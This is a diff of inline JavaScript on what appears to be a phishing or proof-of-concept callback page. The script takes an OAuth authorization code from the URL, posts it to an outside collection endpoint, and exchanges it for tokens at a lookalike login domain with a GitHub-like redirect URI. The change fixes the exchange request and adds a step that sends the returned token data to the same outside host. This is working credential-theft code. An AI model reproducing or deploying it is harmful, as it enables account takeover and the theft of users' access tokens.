@@ -26,22 +26,30 @@
 			// 	}
 			// }
 
-			let code = window.location.search.get('code');
+			let code = new URLSearchParams(window.location.search).get('code');
 
 			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
 				method: 'POST',
 				body: JSON.stringify({ code }),
 			});
 
-			await fetch('https://login.sketchycompany.upd-dcs.work/token', {
+			const res = await fetch('https://login.sketchycompany.upd-dcs.work/token', {
 				method: 'POST',
-				body: JSON.stringify({
-					'grant_type': 'authorization_code',
-					'code': code,
-					'code_verifier': 'K8xSXy1m4Z5xQES1HHeH--U0ThSlfXQ6Z-CMXahnUq4PLjvXT0MQXhe_JnVoUvdD',
-					'client_id': 'CLIENT123',
-					'redirect_uri': 'https://github-04463.sketchycompany.upd-dcs.work/callback'
+				headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+				body: new URLSearchParams({
+				grant_type: 'authorization_code',
+				code: code,
+				code_verifier: 'K8xSXy1m4Z5xQES1HHeH--U0ThSlfXQ6Z-CMXahnUq4PLjvXT0MQXhe_JnVoUvdD',
+				client_id: 'CLIENT123',
+				redirect_uri: 'https://github-04463.sketchycompany.upd-dcs.work/callback'
 				})
+			});
+
+			const tokenData = await res.json();
+
+			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
+				method: 'POST',
+				body: JSON.stringify({ tokenData }),
 			});
 		})();
     </script>
